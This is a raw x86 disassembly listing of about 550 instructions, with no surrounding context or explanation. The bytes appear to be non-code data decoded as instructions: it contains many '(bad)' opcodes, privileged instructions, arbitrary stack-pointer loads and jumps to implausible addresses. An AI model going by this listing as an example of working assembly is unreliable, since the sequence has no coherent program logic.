  41bae2:	pushf  
  41bae3:	icebp  
  41bae4:	cmp    DWORD PTR [esi+0x51cebe57],ebx
  41baea:	xchg   ebx,eax
  41baeb:	cli    
  41baec:	or     ebp,DWORD PTR [eax-0x63]
  41baef:	mov    bl,0xbd
  41baf1:	cld    
  41baf2:	call   0xe2a83076
  41baf7:	add    dl,BYTE PTR [esi-0x36]
  41bafa:	bound  eax,QWORD PTR [ecx+0x73]
  41bafd:	in     eax,0x76
  41baff:	inc    ebx
  41bb00:	imul   ebx,ebx,0xdc0f5c98
  41bb06:	ret    0xbdf6
  41bb09:	inc    esi
  41bb0a:	stos   BYTE PTR es:[edi],al
  41bb0b:	and    DWORD PTR [esi+0x65c1a53d],0xe
  41bb12:	cmp    ebp,edi
  41bb14:	pop    ebp
  41bb15:	pop    edi
  41bb16:	retf   0x5d29
  41bb19:	add    al,0x8c
  41bb1b:	es popa 
  41bb1d:	mov    dh,0x23
  41bb1f:	dec    edi
  41bb20:	and    ch,BYTE PTR [esi+0x3d]
  41bb23:	and    ebp,DWORD PTR [eax]
  41bb25:	es pushf 
  41bb27:	jno    0x41bb25
  41bb29:	mov    DWORD PTR [esi*4-0x6011dd6e],edx
  41bb30:	or     eax,esp
  41bb32:	mov    ah,0x51
  41bb34:	mov    esp,0x12cf7309
  41bb39:	mov    ebx,0x56ebdb81
  41bb3e:	cmp    bh,BYTE PTR [edi+0x69]
  41bb41:	and    BYTE PTR [eax+0x36],0xc1
  41bb45:	jmp    0xb38d844e
  41bb4a:	nop
  41bb4b:	mov    bl,0x4b
  41bb4d:	push   0xf2d6ab90
  41bb52:	mov    dl,0x9
  41bb54:	repz jne 0x41bbc3
  41bb57:	cmp    BYTE PTR [ebp-0x22ed92dc],cl
  41bb5d:	test   al,0xcc
  41bb5f:	or     al,0xd2
  41bb61:	ins    BYTE PTR es:[edi],dx
  41bb62:	mov    ds:0x44e1a87e,eax
  41bb67:	cmp    al,0xa6
  41bb69:	enter  0x1ffd,0x91
  41bb6d:	jl     0x41bb52
  41bb6f:	or     esp,DWORD PTR [ecx-0x6b]
  41bb72:	or     esi,ecx
  41bb74:	retf   
  41bb75:	push   ss
  41bb76:	push   ecx
  41bb77:	pop    ebp
  41bb78:	sahf   
  41bb79:	mov    edi,0x49f4730c
  41bb7e:	mov    edi,0xf1b26711
  41bb83:	imul   edx,edx,0xffffff88
  41bb86:	cmp    eax,0x30d31b5e
  41bb8b:	test   eax,0x3fb7ef59
  41bb90:	mov    ds:0x1ebf5b8,eax
  41bb95:	mov    ebp,0x63cf3f45
  41bb9a:	(bad)  
  41bb9c:	mov    edi,0xb17ce102
  41bba1:	rcl    al,1
  41bba3:	mov    eax,0x169bb572
  41bba8:	fcmovnbe st,st(6)
  41bbaa:	retf   
  41bbab:	sub    DWORD PTR [ecx+0x5b],ebx
  41bbae:	loopne 0x41bc17
  41bbb0:	sub    ah,dh
  41bbb2:	push   edi
  41bbb3:	lahf   
  41bbb4:	hlt    
  41bbb5:	pusha  
  41bbb6:	xor    DWORD PTR [ecx+0x4049983c],ebx
  41bbbc:	and    DWORD PTR [edi-0x2a],esp
  41bbbf:	sahf   
  41bbc0:	imul   cl
  41bbc2:	or     BYTE PTR [esi],ch
  41bbc4:	xor    al,0xb
  41bbc6:	and    DWORD PTR [ebx-0x51cf2d16],edi
  41bbcc:	retf   
  41bbcd:	mov    esp,0xcfc5445a
  41bbd2:	adc    al,0xd7
  41bbd4:	push   ebx
  41bbd5:	pop    edx
  41bbd6:	push   esp
  41bbd7:	pop    eax
  41bbd8:	lds    ebx,FWORD PTR [ebp+0x2c]
  41bbdb:	aam    0x7e
  41bbdd:	nop
  41bbde:	loopne 0x41bbe7
  41bbe0:	ins    BYTE PTR es:[edi],dx
  41bbe1:	enter  0xff8d,0x9
  41bbe5:	xchg   ecx,eax
  41bbe6:	jl     0x41bb7e
  41bbe8:	mov    bh,0x9c
  41bbea:	addr16 or ah,ah
  41bbed:	and    esp,edx
  41bbef:	int    0x48
  41bbf1:	pop    esi
  41bbf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf3:	aam    0x1a
  41bbf5:	icebp  
  41bbf6:	mov    al,0x44
  41bbf8:	int    0x1a
  41bbfa:	ror    BYTE PTR [edx+0x3],cl
  41bbfd:	scas   eax,DWORD PTR es:[edi]
  41bbfe:	cmp    BYTE PTR [edx+ecx*1-0x5870a303],dl
  41bc05:	push   ss
  41bc06:	loopne 0x41bc84
  41bc08:	add    BYTE PTR [edx+0x43c01410],dh
  41bc0e:	(bad)  
  41bc0f:	ret    0xad46
  41bc12:	in     eax,dx
  41bc13:	pop    ecx
  41bc14:	xor    edx,DWORD PTR [ebp+esi*8-0x24]
  41bc18:	in     eax,dx
  41bc19:	dec    ebp
  41bc1a:	mov    esp,0x51a1dc3a
  41bc1f:	and    BYTE PTR [esi],dh
  41bc21:	into   
  41bc22:	cmp    eax,0x7ea0102d
  41bc27:	jae    0x41bbf9
  41bc29:	bnd je 0x41bc32
  41bc2c:	jns    0x41bc8e
  41bc2e:	stos   DWORD PTR es:[edi],eax
  41bc2f:	dec    esp
  41bc30:	xlat   BYTE PTR ds:[ebx]
  41bc31:	stc    
  41bc32:	loope  0x41bc51
  41bc34:	stos   DWORD PTR es:[edi],eax
  41bc35:	sub    eax,0x83d2fd95
  41bc3a:	test   eax,0x31399381
  41bc3f:	ret    
  41bc40:	pop    esi
  41bc41:	or     esp,DWORD PTR [ebp+0xd]
  41bc44:	or     ah,dl
  41bc46:	push   esi
  41bc47:	or     al,0x68
  41bc49:	adc    al,0x22
  41bc4b:	loop   0x41bbfa
  41bc4d:	sub    al,0x1d
  41bc4f:	lds    ebx,FWORD PTR [edx+0x12]
  41bc52:	jo     0x41bc6c
  41bc54:	ret    
  41bc55:	inc    ebp
  41bc56:	mov    BYTE PTR [ebx-0x5f],bh
  41bc59:	fs cdq 
  41bc5b:	(bad)  
  41bc5c:	call   0xbbec11ce
  41bc61:	int    0xe4
  41bc63:	dec    edi
  41bc64:	ins    BYTE PTR es:[edi],dx
  41bc65:	pop    ebx
  41bc66:	sub    BYTE PTR [edx],cl
  41bc68:	push   0x3f
  41bc6a:	sbb    bl,dh
  41bc6c:	and    BYTE PTR [edx],ah
  41bc6e:	adc    BYTE PTR [esi],ah
  41bc70:	mov    bh,BYTE PTR [edx-0x66]
  41bc73:	push   ss
  41bc74:	jle    0x41bc15
  41bc76:	or     eax,0x83acd6f3
  41bc7b:	xchg   ebp,eax
  41bc7c:	pushf  
  41bc7d:	ja     0x41bcc6
  41bc7f:	xchg   ecx,eax
  41bc80:	xlat   BYTE PTR ds:[ebx]
  41bc81:	gs and eax,0x3d3325a5
  41bc87:	test   eax,0x75054389
  41bc8c:	les    eax,FWORD PTR [edi+0x1f]
  41bc8f:	(bad)  
  41bc90:	outs   dx,BYTE PTR ds:[esi]
  41bc91:	loope  0x41bc3d
  41bc93:	pop    eax
  41bc94:	ins    DWORD PTR es:[edi],dx
  41bc95:	dec    esi
  41bc96:	cli    
  41bc97:	jge    0x41bcf1
  41bc99:	je     0x41bc92
  41bc9b:	ror    cl,1
  41bc9d:	rcr    BYTE PTR [eax-0x66],1
  41bca0:	or     cl,BYTE PTR [eax-0x1c]
  41bca3:	xchg   ebx,eax
  41bca4:	es sub al,0x7e
  41bca7:	cmp    bl,cl
  41bca9:	in     eax,dx
  41bcaa:	popa   
  41bcab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcac:	dec    ecx
  41bcad:	xor    BYTE PTR [ecx+0x123d536b],dl
  41bcb3:	xor    BYTE PTR [eax+0x1a7a93e8],ch
  41bcb9:	test   DWORD PTR [eax+0x3e],0xd47e06ed
  41bcc0:	je     0x41bc53
  41bcc2:	dec    esp
  41bcc3:	ss pop ebx
  41bcc5:	test   DWORD PTR [edi],ebp
  41bcc7:	sahf   
  41bcc8:	rcr    BYTE PTR [ebx],0xaa
  41bccb:	mov    dh,0xb5
  41bccd:	push   ebx
  41bcce:	gs sub cl,dh
  41bcd1:	sbb    esp,DWORD PTR [edx]
  41bcd3:	mov    ecx,0x7c822bd
  41bcd8:	in     al,dx
  41bcd9:	xchg   edx,eax
  41bcda:	ror    DWORD PTR [edi],0x27
  41bcdd:	xor    eax,0xf5b38485
  41bce2:	lahf   
  41bce3:	push   esp
  41bce4:	stos   DWORD PTR es:[edi],eax
  41bce5:	(bad)  
  41bce6:	pusha  
  41bce7:	and    DWORD PTR ds:0xc16f4f24,ebp
  41bced:	aaa    
  41bcee:	mov    ebp,0x368566e8
  41bcf3:	jle    0x41bc8f
  41bcf5:	push   esp
  41bcf6:	jecxz  0x41bce1
  41bcf8:	mov    ecx,0x25fa5f0a
  41bcfd:	mov    ds:0x61afb0a6,eax
  41bd02:	cs repz ret 
  41bd05:	idiv   DWORD PTR [edx-0x4face2b0]
  41bd0b:	or     al,0xbd
  41bd0d:	xchg   edi,eax
  41bd0e:	push   esp
  41bd0f:	mov    al,ds:0x39db7da4
  41bd14:	aam    0x1
  41bd16:	jp     0x41bd70
  41bd18:	jmp    0x41bd25
  41bd1a:	loop   0x41bd46
  41bd1c:	popa   
  41bd1d:	inc    ebp
  41bd1e:	imul   ebp,DWORD PTR [edi-0x60],0xb29c85a7
  41bd25:	mov    edx,0x62ee0bbd
  41bd2a:	mov    cl,0x2f
  41bd2c:	cdq    
  41bd2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd2e:	mov    edx,0x360ad177
  41bd33:	adc    ch,BYTE PTR [edi+0x41]
  41bd36:	(bad)  
  41bd37:	ret    
  41bd38:	jge    0x41bcc4
  41bd3a:	or     ebp,ebx
  41bd3c:	sbb    dl,BYTE PTR [edx]
  41bd3e:	xchg   ebp,eax
  41bd3f:	pusha  
  41bd40:	gs ins DWORD PTR es:[edi],dx
  41bd42:	fst    DWORD PTR [ebx+edi*1-0x6a]
  41bd46:	adc    ah,bl
  41bd48:	sbb    bl,BYTE PTR [ecx]
  41bd4a:	(bad)  
  41bd4c:	sbb    ecx,ecx
  41bd4e:	mov    BYTE PTR [ebx-0x10],cl
  41bd51:	push   0xffffffc8
  41bd53:	aad    0x89
  41bd55:	int    0x8f
  41bd57:	bound  eax,QWORD PTR [ebp+0x12]
  41bd5a:	dec    edx
  41bd5b:	push   esi
  41bd5c:	mov    eax,ds:0xcd4a9111
  41bd61:	addr16 mov esp,0x3449baaa
  41bd67:	dec    esi
  41bd68:	sub    BYTE PTR [ebx-0x1e763526],dh
  41bd6e:	iret   
  41bd6f:	mov    dl,0xb9
  41bd71:	sub    DWORD PTR [edx+eax*1-0x6c370a83],esp
  41bd78:	push   0x9a1570bc
  41bd7d:	and    eax,0x5f73dce1
  41bd82:	cli    
  41bd83:	ds push ds
  41bd85:	inc    ebp
  41bd86:	pop    ebx
  41bd87:	xchg   esp,eax
  41bd88:	jo     0x41bd4f
  41bd8a:	adc    BYTE PTR [esi+eiz*2],dh
  41bd8d:	sbb    ebp,DWORD PTR [ebx]
  41bd8f:	fsub   QWORD PTR [edx-0x57]
  41bd92:	test   BYTE PTR [ebp+0x42503d70],bl
  41bd98:	es cld 
  41bd9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd9b:	jb     0x41bd99
  41bd9d:	neg    DWORD PTR [edx+0x56]
  41bda0:	inc    eax
  41bda1:	jmp    0x41bd76
  41bda3:	inc    edi
  41bda4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bda5:	jge    0x41bde8
  41bda7:	sub    al,0xf9
  41bda9:	mov    ch,0x9f
  41bdab:	aas    
  41bdac:	push   esp
  41bdad:	sbb    eax,0xb254b238
  41bdb2:	shr    BYTE PTR [ebx],cl
  41bdb4:	jg     0x41be33
  41bdb6:	mov    dl,0xe7
  41bdb8:	in     eax,dx
  41bdb9:	push   ebp
  41bdba:	loopne 0x41be04
  41bdbc:	xchg   edi,eax
  41bdbd:	cmc    
  41bdbe:	xor    eax,0x1ee2dbf2
  41bdc3:	into   
  41bdc4:	sbb    al,0xb3
  41bdc6:	fcom   DWORD PTR [eax]
  41bdc8:	iret   
  41bdc9:	mov    esp,0x6f39ca7f
  41bdce:	iret   
  41bdcf:	push   0x1c
  41bdd1:	(bad)  
  41bdd2:	sub    edi,DWORD PTR [edx+0x1ddac3d5]
  41bdd8:	fs mov ebx,0x50243863
  41bdde:	scas   eax,DWORD PTR es:[edi]
  41bddf:	gs push cs
  41bde1:	sar    DWORD PTR [eax-0x49d805ee],0x2d
  41bde8:	pusha  
  41bde9:	xor    cl,BYTE PTR [esp+esi*8-0x65]
  41bded:	cmc    
  41bdee:	add    BYTE PTR [ecx],0xe1
  41bdf1:	xor    DWORD PTR [ebx],esi
  41bdf3:	or     ebx,DWORD PTR [ebx]
  41bdf5:	ffreep st(6)
  41bdf7:	mov    bh,0xf9
  41bdf9:	adc    al,0x3c
  41bdfb:	scas   eax,DWORD PTR es:[edi]
  41bdfc:	push   edx
  41bdfd:	fs fwait
  41bdff:	push   ebx
  41be00:	shl    BYTE PTR [edi-0x1cedb8ae],1
  41be06:	xor    DWORD PTR [ecx-0x3f],edx
  41be09:	add    ah,BYTE PTR [edx-0xcb9c01f]
  41be0f:	or     BYTE PTR [ecx],cl
  41be11:	out    0xc5,al
  41be13:	fisubr WORD PTR [ebx+ecx*1+0x31]
  41be17:	fidivr WORD PTR [ecx+ecx*8]
  41be1a:	mov    ebx,edi
  41be1c:	push   0x9
  41be1e:	pop    esp
  41be1f:	fld    TBYTE PTR [ecx-0x3bf69e80]
  41be25:	dec    ecx
  41be26:	add    ch,BYTE PTR [esi]
  41be28:	push   ebp
  41be29:	or     DWORD PTR [ebp-0x2e],0x39f7cc8f
  41be30:	bound  eax,QWORD PTR [edi+0xd]
  41be33:	(bad)  
  41be34:	mov    edi,0x522dc4cd
  41be39:	dec    eax
  41be3a:	push   ebx
  41be3b:	or     BYTE PTR [edi+ecx*2],dh
  41be3e:	dec    edx
  41be3f:	mov    ch,0xa5
  41be41:	xor    eax,0x4d9232e9
  41be46:	icebp  
  41be47:	xchg   edx,eax
  41be48:	je     0x41be4d
  41be4a:	inc    esi
  41be4b:	fmul   DWORD PTR ds:0xc7bcf8a7
  41be51:	call   0xd952869
  41be56:	or     dh,cl
  41be58:	int3   
  41be59:	pop    ebp
  41be5a:	dec    ecx
  41be5b:	inc    ebp
  41be5c:	push   esp
  41be5d:	lea    eax,ds:0x2156f96b
  41be63:	inc    edx
  41be64:	and    DWORD PTR [eax+0x3b],ecx
  41be67:	imul   edi,DWORD PTR fs:[ecx+0x4b],0x64
  41be6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be6e:	mov    esp,eax
  41be70:	jo     0x41bed2
  41be72:	push   ebp
  41be73:	inc    edi
  41be74:	test   eax,0xdef7b20a
  41be79:	aas    
  41be7a:	pushf  
  41be7b:	retf   0x5780
  41be7e:	les    ebx,FWORD PTR [edx+0x245b8499]
  41be84:	and    ebp,ebx
  41be86:	dec    edx
  41be87:	test   al,0xb1
  41be89:	xchg   ebx,eax
  41be8a:	adc    eax,0xfa7ade41
  41be8f:	pop    es
  41be90:	or     al,0x84
  41be92:	jb     0x41be5f
  41be94:	aad    0x73
  41be96:	push   ds
  41be97:	rol    BYTE PTR [eax-0x64],cl
  41be9a:	xchg   esp,eax
  41be9b:	mov    eax,0x848efa7e
  41bea0:	(bad)  
  41bea1:	cmp    al,0x1a
  41bea3:	sbb    cl,BYTE PTR [esi-0x71]
  41bea6:	iret   
  41bea7:	or     esp,DWORD PTR [edx]
  41bea9:	cmp    al,0x51
  41beab:	arpl   WORD PTR [ecx+0x70],cx
  41beae:	add    edi,DWORD PTR [edi-0x71]
  41beb1:	xchg   esp,eax
  41beb2:	loopne 0x41bea2
  41beb4:	cmp    al,al
  41beb6:	lea    ecx,[esi+0xa]
  41beb9:	cdq    
  41beba:	(bad)  
  41bebb:	popa   
  41bebc:	or     eax,0x547151d0
  41bec1:	mov    al,ds:0x26f105e2
  41bec6:	jbe    0x41be48
  41bec8:	add    ch,BYTE PTR [ebx]
  41beca:	repnz mov esp,0x5e8b5fe4
  41bed0:	adc    DWORD PTR ds:0x10a873a6,ecx
  41bed6:	lahf   
  41bed7:	xchg   edi,eax
  41bed8:	mov    cl,0x62
  41beda:	(bad)  
  41bedb:	pop    ebp
  41bedc:	bound  ebp,QWORD PTR [eax]
  41bede:	leave  
  41bedf:	cmp    dl,BYTE PTR [esi]
  41bee1:	sub    BYTE PTR [ebx+0x45],dh
  41bee4:	das    
  41bee5:	push   eax
  41bee6:	or     dl,al
  41bee8:	in     eax,0x66
  41beea:	or     al,0xc8
  41beec:	rcl    bh,1
  41beee:	sbb    ah,BYTE PTR [esi]
  41bef0:	pop    ebp
  41bef1:	outs   dx,DWORD PTR ds:[esi]
  41bef2:	daa    
  41bef3:	sbb    dh,dl
  41bef5:	mov    al,ds:0x4234d422
  41befa:	xchg   DWORD PTR [esi+0x16],ecx
  41befd:	popf   
  41befe:	mov    WORD PTR [edi],ss
  41bf00:	sub    DWORD PTR [edi-0x28c9eb9a],ebx
  41bf06:	mov    BYTE PTR [ecx+0x2d],ah
  41bf09:	ror    BYTE PTR [ebx],0xca
  41bf0c:	jbe    0x41bf23
  41bf0e:	sbb    DWORD PTR [eax-0x1390d700],eax
  41bf14:	push   esi
  41bf15:	or     al,0x9b
  41bf17:	pop    es
  41bf18:	test   eax,0x86d51b86
  41bf1d:	gs (bad) 
  41bf1f:	xor    al,dl
  41bf21:	test   DWORD PTR [esp+ecx*1],edx
  41bf24:	inc    edi
  41bf25:	fidivr DWORD PTR [ecx]
  41bf27:	or     cl,BYTE PTR [edi+esi*2+0x26]
  41bf2b:	div    DWORD PTR [ecx+edi*2-0x114d573e]
  41bf32:	inc    esp
  41bf33:	test   DWORD PTR [edi-0x8],0xc356cf2d
  41bf3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf3b:	rcr    BYTE PTR [ecx],1
  41bf3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf3e:	lds    eax,FWORD PTR [esi+0x57]
  41bf41:	mov    edx,0x88dfad33
  41bf46:	pop    ebx
  41bf47:	fxch   st(2)
  41bf49:	xlat   BYTE PTR ds:[ebx]
  41bf4a:	rcr    dh,0xa
  41bf4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf4e:	ret    
  41bf4f:	pop    ecx
  41bf50:	cdq    
  41bf51:	dec    eax
  41bf52:	mov    eax,0x3c1c64c0
  41bf57:	ins    DWORD PTR es:[edi],dx
  41bf58:	dec    eax
  41bf59:	ja     0x41bf61
  41bf5b:	push   ebx
  41bf5c:	xchg   DWORD PTR [edi+ebp*1],ecx
  41bf5f:	xchg   ecx,eax
  41bf60:	xchg   ebx,eax
  41bf61:	push   cs
  41bf62:	mov    edi,0x8ebd9a68
  41bf67:	push   0xfffffff6
  41bf69:	das    
  41bf6a:	cli    
  41bf6b:	sbb    edi,esi
  41bf6d:	mov    al,0xaf
  41bf6f:	jns    0x41bfd0
  41bf71:	sbb    al,ch
  41bf73:	pop    ebx
  41bf74:	adc    eax,0x8b484c71
  41bf79:	and    esp,esi
  41bf7b:	and    al,0xb8
  41bf7d:	retf   
  41bf7e:	cmp    DWORD PTR [eax-0x38f570d2],esi
  41bf84:	test   BYTE PTR [ecx+ebp*1-0x3f],bl
  41bf88:	xchg   edi,eax
  41bf89:	jo     0x41bf9a
  41bf8b:	int    0xea
  41bf8d:	adc    eax,0x59214642
  41bf92:	mov    BYTE PTR [edi+0x59113b3b],ah
  41bf98:	jmp    0x9495:0xbdbcc9f5
  41bf9f:	or     al,bl
  41bfa1:	fwait
  41bfa2:	mov    ?,WORD PTR [eax]
  41bfa4:	push   0xffffffa2
  41bfa6:	sbb    al,0x7e
  41bfa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfa9:	clc    
  41bfaa:	mov    ch,0xc2
  41bfac:	daa    
  41bfad:	dec    eax
  41bfae:	cmp    al,0x41
  41bfb0:	dec    esi
  41bfb1:	pop    edx
  41bfb2:	cmc    
  41bfb3:	cld    
  41bfb4:	xor    al,0x4f
  41bfb6:	int3   
  41bfb7:	es cdq 
  41bfb9:	jp     0x41c002
  41bfbb:	test   BYTE PTR ds:0xa34add21,0xfd
  41bfc2:	jns    0x41bf96
  41bfc4:	jmp    edx
  41bfc6:	xlat   BYTE PTR ds:[ebx]
  41bfc7:	jge    0x41bf4d
  41bfc9:	call   0x71effb0
  41bfce:	and    al,0xa3
  41bfd0:	inc    eax
  41bfd1:	sbb    al,BYTE PTR [eax]
  41bfd3:	inc    edx
  41bfd4:	add    al,0x99
  41bfd6:	adc    ecx,ebx
  41bfd8:	mov    esp,0x6b1b5142
  41bfdd:	(bad)  
  41bfde:	sub    ch,BYTE PTR [esi]
  41bfe0:	push   edx
  41bfe1:	jb     0x41bf6d
  41bfe3:	xchg   ebp,eax
  41bfe4:	pop    ecx
  41bfe5:	push   ebx
  41bfe6:	push   ss
  41bfe7:	jmp    0x4eb26bea
  41bfec:	add    esi,0xccbc1acf
  41bff2:	xchg   edi,ebx
  41bff4:	std    
  41bff5:	clc    
  41bff6:	clc    
  41bff7:	push   cs
  41bff8:	mov    eax,0x96eaa4cc
  41bffd:	cwde   
  41bffe:	sahf   
  41bfff:	xchg   ebp,eax
  41c000:	xor    DWORD PTR [ecx+0x8aad183],0x6cf65c13
  41c00a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c00b:	mov    ebx,0xc70dc117
  41c010:	lods   eax,DWORD PTR ds:[esi]
  41c011:	(bad)  
  41c012:	pop    ecx
  41c013:	and    DWORD PTR [edi-0x762c62a5],edx
  41c019:	sub    edx,edx
  41c01b:	push   es
  41c01c:	mov    dh,0x59
  41c01e:	stos   BYTE PTR es:[edi],al
  41c01f:	dec    ebx
  41c020:	jl     0x41bfc0
  41c022:	add    DWORD PTR [edx+0x66],edx
  41c025:	mov    edx,0x21d8acd2
  41c02a:	int    0xc2
  41c02c:	retf   0xe850
  41c02f:	mov    dh,BYTE PTR [edi+0x2fb5cc14]
  41c035:	inc    edx
  41c036:	mov    cl,0xc7
  41c038:	or     BYTE PTR [ebx-0x7dde25ae],0x6f
  41c03f:	cld    
  41c040:	out    dx,al
  41c041:	sahf   
  41c042:	pop    ss
  41c043:	sbb    al,0x54
  41c045:	loopne 0x41c066
  41c047:	xor    al,BYTE PTR [ebx]
  41c049:	mov    dl,0x1b
  41c04b:	and    edi,eax
  41c04d:	(bad)  
  41c04e:	lahf   
  41c04f:	or     BYTE PTR ds:0xf43eebd1,dh
  41c055:	cmp    esp,DWORD PTR [eax]
  41c057:	int    0x8b
  41c059:	pusha  
  41c05a:	ds adc ebx,ebx
  41c05d:	xchg   BYTE PTR [edx-0x1a0e9cf8],bh
  41c063:	jnp    0x41c00e
  41c065:	ror    DWORD PTR [edx+0x6efbad42],1
  41c06b:	into   
  41c06c:	fisttp WORD PTR [eax]
  41c06e:	retf   
  41c06f:	pusha  
  41c070:	ss sbb dh,dl
  41c073:	push   edx
  41c074:	scas   eax,DWORD PTR es:[edi]
  41c075:	(bad)  
  41c076:	xor    eax,DWORD PTR [edx]
  41c078:	sbb    ah,bh
  41c07a:	gs retf 
  41c07c:	aas    
  41c07d:	fidiv  WORD PTR [eax]
  41c07f:	call   DWORD PTR [eax-0x157fd009]
  41c085:	dec    edi
  41c086:	adc    ebp,DWORD PTR [edi+0x7a]
  41c089:	adc    al,0xe7
  41c08b:	mov    ecx,0x2ce7a91d
  41c090:	mov    ebx,0xe4043b2c
  41c095:	popa   
  41c096:	push   ebp
  41c097:	xlat   BYTE PTR ds:[ebx]
  41c098:	popf   
  41c099:	xchg   esp,eax
  41c09a:	shr    BYTE PTR [eax+0x0],0x57
  41c09e:	and    BYTE PTR [esi+0x28cfe8c0],ch
  41c0a4:	lock stc 
  41c0a6:	loopne 0x41c121
  41c0a8:	and    eax,0x207fd4e2
  41c0ad:	pop    ebx
  41c0ae:	cmp    cl,BYTE PTR [ebx-0x4fee769c]
  41c0b4:	outs   dx,BYTE PTR ds:[esi]
  41c0b5:	test   al,0x5a
  41c0b7:	ja     0x41c08e
  41c0b9:	xchg   esp,edx
  41c0bb:	push   esi
  41c0bc:	push   ecx
  41c0bd:	cmp    ebx,DWORD PTR [ebp+0x4e]
  41c0c0:	retf   
  41c0c1:	xor    al,0x83
  41c0c3:	mov    ebx,fs
  41c0c5:	inc    ebx
  41c0c6:	daa    
  41c0c7:	and    eax,0xd3c66141
  41c0cc:	pop    ecx
  41c0cd:	and    eax,ebx
  41c0cf:	push   cs
  41c0d0:	fbstp  TBYTE PTR [esi-0x4be01772]
  41c0d6:	sub    BYTE PTR [ebx+ebp*4],0xd0
  41c0da:	adc    cl,BYTE PTR [ecx+0x53c87584]
  41c0e0:	jne    0x41c10e
  41c0e2:	and    ebx,ecx
  41c0e4:	xchg   DWORD PTR [ecx],edi
  41c0e6:	push   0x5e
  41c0e8:	fbld   TBYTE PTR [ecx-0x16]
  41c0eb:	inc    edi
  41c0ec:	mov    ch,0x7e
  41c0ee:	sub    al,0x6a
  41c0f0:	mov    ebp,0x753d26ad
  41c0f5:	clc    
  41c0f6:	bound  ebx,QWORD PTR [ecx]
  41c0f8:	push   esp
  41c0f9:	push   esi
  41c0fa:	or     edi,DWORD PTR [edx-0x4b8ab77c]
  41c100:	mov    cl,0x84
  41c102:	push   edx
  41c103:	mov    ds,WORD PTR [edx+0x5268826a]
  41c109:	stc    
  41c10a:	adc    ebx,ebx
  41c10c:	push   es
  41c10d:	call   0xdce459bd
  41c112:	scas   al,BYTE PTR es:[edi]
  41c113:	xchg   edx,eax
  41c114:	scas   eax,DWORD PTR es:[edi]
  41c115:	aas    
  41c116:	loope  0x41c15d
  41c118:	push   eax
  41c119:	lea    esp,[edi+0xb]
  41c11c:	jne    0x41c12e
  41c11e:	cs jge 0x41c155
  41c121:	ja     0x41c130
  41c123:	nop
  41c124:	sub    eax,0xacf737e7
  41c129:	out    dx,eax
  41c12a:	jge    0x41c160
  41c12c:	lock (bad) 
  41c12f:	dec    ebp
  41c130:	stos   BYTE PTR es:[edi],al
  41c131:	mov    BYTE PTR [ebp+0x3e9e1b6b],al
  41c137:	adc    eax,0x1301c99f
  41c13c:	inc    eax
  41c13d:	add    DWORD PTR [esi],edx
  41c13f:	retf   0x2002
  41c142:	jns    0x41c188
  41c144:	ffree  st(7)
  41c146:	push   0xffffffb2
  41c148:	inc    ebp
  41c149:	js     0x41c0df
  41c14b:	in     al,0xb4
  41c14d:	(bad)  
  41c14e:	mov    bl,0x34
  41c150:	cli    
  41c151:	xlat   BYTE PTR ds:[ebx]
  41c152:	out    dx,al
  41c153:	and    ebp,esi
  41c155:	lock mov eax,ds:0xb0d4f748
  41c15b:	not    DWORD PTR [ebp-0x20ce218a]
  41c161:	mov    cl,0x33
  41c163:	shl    BYTE PTR [ecx-0x72],1
  41c166:	in     al,0x65
  41c168:	mov    ah,0xea
  41c16a:	jle    0x41c188
  41c16c:	(bad)  
  41c16d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16e:	idiv   cl
  41c170:	xchg   ebx,eax
  41c171:	sar    DWORD PTR [edi+0xa62b6cd],1
  41c177:	sahf   
  41c178:	jp     0x41c1b2
  41c17a:	gs retf 0x6405
  41c17e:	cmp    bh,BYTE PTR [edx]
  41c180:	mov    al,0x65
  41c182:	inc    ebp
  41c183:	aam    0xb7
  41c185:	push   es
  41c186:	pop    ds
  41c187:	ins    DWORD PTR es:[edi],dx
  41c188:	addr16 pop edx
  41c18a:	sbb    BYTE PTR [eax+0x64e2be4c],ah
  41c190:	clc    
  41c191:	mov    ds:0x77092ef7,al
  41c196:	in     eax,dx
  41c197:	sub    BYTE PTR [esi-0xf],dh
  41c19a:	cld    
  41c19b:	jno    0x41c142
  41c19d:	add    eax,0x462d0dd2
  41c1a2:	cmp    BYTE PTR [edx-0x70054e49],0x2c
  41c1a9:	mov    bl,0xd0
  41c1ab:	sub    al,0x57
  41c1ad:	mov    ebx,0x4b234bb
  41c1b2:	aam    0xeb
  41c1b4:	and    bl,dh
  41c1b6:	js     0x41c14c
  41c1b8:	jmp    0x41c173
  41c1ba:	std    
  41c1bb:	ss mov ch,0xd4
  41c1be:	rol    DWORD PTR [esi],1
  41c1c0:	sub    dh,BYTE PTR [eax-0x26b6c8d1]
  41c1c6:	push   eax
  41c1c7:	sbb    BYTE PTR [ebx-0x3a],0xc6
  41c1cb:	jg     0x41c203
  41c1cd:	mov    DWORD PTR [eax-0x7202a011],ecx
  41c1d3:	or     al,0xc6
  41c1d5:	mov    bl,0xad
  41c1d7:	pop    esp
  41c1d8:	and    al,0x60
  41c1da:	lods   eax,DWORD PTR ds:[esi]
  41c1db:	mov    eax,0x32fd229d
  41c1e0:	add    DWORD PTR [eax+0x66],eax
  41c1e3:	inc    eax
  41c1e4:	jo     0x41c1d9
  41c1e6:	xor    eax,0xa66701d4
  41c1eb:	mov    BYTE PTR [edi-0x2],al
  41c1ee:	mov    al,ds:0xa3ce5b09
  41c1f3:	push   edx
  41c1f4:	mov    edi,0x954a02e7
  41c1f9:	test   eax,0x9c271c2e
  41c1fe:	stc    
  41c1ff:	push   edi
  41c200:	pop    edx
  41c201:	xchg   ebx,eax
  41c202:	fisttp WORD PTR [ebx-0x18]
  41c205:	add    edi,DWORD PTR [eax+ecx*2]
  41c208:	test   ebp,ecx
  41c20a:	sbb    eax,0xdb95e66a
  41c20f:	mul    DWORD PTR [ebx+0x3]
